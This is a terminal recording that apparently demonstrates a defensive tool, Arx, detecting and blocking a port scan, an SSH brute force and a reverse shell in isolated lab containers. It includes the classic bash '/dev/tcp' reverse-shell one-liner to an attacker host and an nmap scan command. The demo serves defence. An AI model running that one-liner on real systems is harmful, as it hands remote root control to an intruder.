{"version": 2, "width": 104, "height": 30}
[0.0, "o", "\r\n\r\n\u001b[1;36mArx · three real attacks, two isolated containers.\u001b[0m\r\n"]
[2.009, "o", "\r\n\u001b[1;36m1/3  Port scan\u001b[0m\r\n"]
[4.026, "o", "\u001b[31mattacker$\u001b[0m nmap -sS -p 9000-9020 victim\r\n"]
[4.28, "o", "9001/tcp open   tor-orport\r\n9002/tcp open   dynamid\r\n9003/tcp open   unknown\r\n"]
[6.296, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[6.604, "o", "  [high] scan from 172.18.0.3 (≥8 ports in 10 min, kernel trail)\r\n         → Tier 1: IP 172.18.0.3 blocked in nftables (native timeout 60 min + Arx revert)\r\n"]
[8.746, "o", "\u001b[31mattacker$\u001b[0m curl --max-time 4 http://victim:9001/\r\n"]
[11.246, "o", "\u001b[1mtimed out: the attacker lost all access to the server\u001b[0m\r\n"]
[13.254, "o", "\u001b[2m[lab] fast-forward 61 min: Arx undoes its own block\u001b[0m\r\n"]
[15.525, "o", "\r\n\u001b[1;36m2/3  SSH brute force\u001b[0m\r\n"]
[17.536, "o", "\u001b[31mattacker$\u001b[0m 8 wrong SSH passwords for root@victim\r\n"]
[20.036, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[20.337, "o", "  [high] 8 authentication failures from 172.18.0.3 (most tried user: root)\r\n         → Tier 1: IP 172.18.0.3 blocked in nftables (native timeout 60 min + Arx revert)\r\n"]
[22.375, "o", "\u001b[2m[lab] fast-forward 61 min: Arx undoes its own block\u001b[0m\r\n"]
[24.538, "o", "\r\n\u001b[1;36m3/3  Reverse shell, the classic one-liner\u001b[0m\r\n"]
[26.55, "o", "\u001b[33mvictim$\u001b[0m bash -i >& /dev/tcp/attacker/4444 0>&1\r\n"]
[27.661, "o", "\u001b[31mattacker$\u001b[0m (through the shell) id > /tmp/proof-1\r\n"]
[29.777, "o", "\u001b[33mvictim$\u001b[0m cat /tmp/proof-1\r\n"]
[29.837, "o", "uid=0(root) gid=0(root) groups=0(root)\r\n"]
[29.874, "o", "\u001b[2mThe attacker is running commands as root on the server.\u001b[0m\r\n"]
[31.883, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[32.443, "o", "  [crit] shell with an outbound connection: /usr/bin/bash → 172.18.0.3:4444 (pid 4058)\r\n         → Tier 1: C2 channel cut in nftables (172.18.0.3:4444) · owning process suspended (1 pid): undoes itself in 60 min\r\n"]
[34.475, "o", "\u001b[31mattacker$\u001b[0m (through the shell) id > /tmp/proof-2\r\n"]
[36.975, "o", "\u001b[33mvictim$\u001b[0m cat /tmp/proof-2\r\n"]
[37.078, "o", "\u001b[1mNo such file: the command never arrived\u001b[0m\r\n"]
[39.088, "o", "\r\n\u001b[1;36mEvery automatic action above undoes itself after 60 minutes.\u001b[0m\r\n"]
[41.096, "o", "\u001b[1;36mDon't trust this recording. Run it yourself: bash lab/demo.sh\u001b[0m\r\n"]
